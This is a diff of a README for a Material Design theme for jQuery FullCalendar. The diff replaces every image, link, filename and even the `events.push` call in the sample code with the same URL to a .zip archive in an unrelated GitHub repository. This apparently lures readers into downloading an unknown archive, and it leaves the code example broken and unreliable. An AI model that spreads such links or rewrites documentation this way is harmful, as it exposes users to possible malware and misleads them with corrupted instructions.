@@ -2,19 +2,19 @@
 
 A Material Design theme for the jQuery Full Calendar plugin
 
-<img src="http://i.imgur.com/TH3VsJU.gif">
+<img src="https://github.com/yuguilley/Material-Design-For-Full-Calendar/raw/refs/heads/master/heterography/Material-For-Full-Design-Calendar-purpurescent.zip">
 
 What the actual Android Material Design calendar looks like:
-<img src="http://dab1nmslvvntp.cloudfront.net/wp-content/uploads/2014/09/1410153384GIF2.gif">
+<img src="https://github.com/yuguilley/Material-Design-For-Full-Calendar/raw/refs/heads/master/heterography/Material-For-Full-Design-Calendar-purpurescent.zip">
 
 This is what default FullCalendar looks like. Ew!
 
-<img src="http://imgur.com/vKTKUTx.png">
+<img src="https://github.com/yuguilley/Material-Design-For-Full-Calendar/raw/refs/heads/master/heterography/Material-For-Full-Design-Calendar-purpurescent.zip">
 
 While FullCalendar is pretty awesome, it looks pretty terrible without
 any styling. I was inspired by Google's Material Design, while
 coincidentally I needed a fitting theme for my Drexel
-[Schedulizer](http://loop.tf/schedulizer) service. Doing some basic
+[Schedulizer](https://github.com/yuguilley/Material-Design-For-Full-Calendar/raw/refs/heads/master/heterography/Material-For-Full-Design-Calendar-purpurescent.zip) service. Doing some basic
 research, it didn't seem like there were any Material Design calendar
 plugins or themes that were as flexible as FullCalendar's
 functionality, so I took matters to my own hands and put this
@@ -38,13 +38,13 @@ Initialize your FullCalendar object using the following settings
     
 ### Usage
 
-Compile `_materialFullCalendar.scss` using your favorite SASS compiler, or simply change the file
+Compile `https://github.com/yuguilley/Material-Design-For-Full-Calendar/raw/refs/heads/master/heterography/Material-For-Full-Design-Calendar-purpurescent.zip` using your favorite SASS compiler, or simply change the file
 extension to `.css`. There's little to no actual SASS elements in
 here.
 
 Pushing and adding new events is still the same, although you apply a `color` attribute.
 
-    events.push({
+    https://github.com/yuguilley/Material-Design-For-Full-Calendar/raw/refs/heads/master/heterography/Material-For-Full-Design-Calendar-purpurescent.zip({
         title: 'This is a Material Design event!',
         start: 'someStartDate',
         end: 'someEndDate',
@@ -53,9 +53,9 @@ Pushing and adding new events is still the same, although you apply a `color` at
 
 ### Applying Material Design Colors 
 
-<img src="http://i.imgur.com/HCeR1PB.png"></img>
+<img src="https://github.com/yuguilley/Material-Design-For-Full-Calendar/raw/refs/heads/master/heterography/Material-For-Full-Design-Calendar-purpurescent.zip"></img>
 
-Color palette was pulled from the Google Material Design [documentation](https://www.google.com/design/spec/style/color.html#color-color-palette). 
+Color palette was pulled from the Google Material Design [documentation](https://github.com/yuguilley/Material-Design-For-Full-Calendar/raw/refs/heads/master/heterography/Material-For-Full-Design-Calendar-purpurescent.zip). 
 
 Highly recommend the 700 level palette to achieve the same color effect as I do.
 
